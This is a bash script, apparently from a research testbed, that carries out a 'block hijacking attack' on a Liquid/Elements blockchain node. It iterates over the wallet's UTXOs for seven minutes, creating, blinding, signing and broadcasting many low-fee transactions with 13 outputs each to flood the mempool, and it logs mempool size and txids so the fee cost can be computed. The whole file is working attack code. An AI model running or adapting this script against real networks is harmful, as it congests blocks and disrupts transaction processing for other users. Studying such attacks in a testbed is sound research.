#!/bin/bash

# bash block-hijacking-attack/attack.sh 2

# Block Hijacking Attack:
# Execute after splitting the UTXO input
# Will be executed until a predetermined amount of time has elapsed.

export HOME="$HOME/liquid"

# Set up your node number and amount
node_num=$1
send_amount=0.00004

num_addresses=13 # create this number of reciepents on each transaction

# tx IDs will be saved to calculate total fee
txid_file="txids.txt"

# if txid file already exists
if [ -f $txid_file ]; then
    rm $txid_file
fi
touch $txid_file

# Timeout in seconds
timeout_duration=420 # 7min

# Start time
start_time=$(date +%s)

# Get all utxo transactions and sort
utxo_list=$(elements-cli -datadir=$HOME/elementsdir$node_num listunspent | jq -c 'sort_by(.amount) | reverse')

for utxo in $(echo "$utxo_list" | jq -c '.[]'); do
    s_time=$(date +%s.%N)
    # Check if the timeout duration has passed
    current_time=$(date +%s)
    elapsed_time=$((current_time - start_time))
    if [ $elapsed_time -ge $timeout_duration ]; then
        echo "Timeout reached, exiting the loop."
        break
    fi

    txid=$(echo $utxo | jq -r '.txid')
    vout=$(echo $utxo | jq -r '.vout')

    amount=$(echo $utxo | jq -r '.amount')
    # echo "amount: $amount"

    # Initialize the raw transaction input
    recipients="["
    for ((j = 1; j <= num_addresses; j++)); do
        # Get a new address
        address=$(elements-cli -datadir=$HOME/elementsdir$node_num getnewaddress)

        # Append the address and amount to the raw transaction input
        if [ $j -eq $num_addresses ]; then
            recipients+="{\"$address\":$send_amount}"
        else
            recipients+="{\"$address\":$send_amount},"
        fi
    done
    recipients+="]"

    # Create a raw transaction
    rawtx=$(elements-cli -datadir=$HOME/elementsdir$node_num createrawtransaction "[{\"txid\":\"$txid\",\"vout\":$vout}]" "$recipients")

    # Fund the transaction (Largest Time for each attack TX)
    fundedtx=$(elements-cli -datadir=$HOME/elementsdir$node_num fundrawtransaction $rawtx '{"feeRate": 0.00000200}' | jq -r '.hex')

    e_time=$(date +%s.%N)
    the_time=$(echo "scale=2; $e_time - $s_time" | bc)
    the_time=$(printf "%.2f" "$the_time")
    echo "$the_time seconds"

    # Blind the transaction
    blindedtx=$(elements-cli -datadir=$HOME/elementsdir$node_num blindrawtransaction $fundedtx)

    # Sign the transaction
    signedtx=$(elements-cli -datadir=$HOME/elementsdir$node_num signrawtransactionwithwallet $blindedtx | jq -r '.hex')

    # Send the transaction
    txid=$(elements-cli -datadir=$HOME/elementsdir$node_num sendrawtransaction $signedtx)

    # mempool info
    mempool_info=$(elements-cli -datadir=$HOME/elementsdir$node_num getmempoolinfo)
    # usage=$(echo $mempool_info | jq '.usage')
    # maxmempool=$(echo $mempool_info | jq '.maxmempool')

    size=$(echo $mempool_info | jq '.size')

    # percent=$(echo "scale=5; $usage / $maxmempool * 100" | bc)

    # echo "txid: $txid, size: $size, mempool: $percent%"
    echo "txid: $txid, size: $size"

    echo $txid >>$txid_file
done
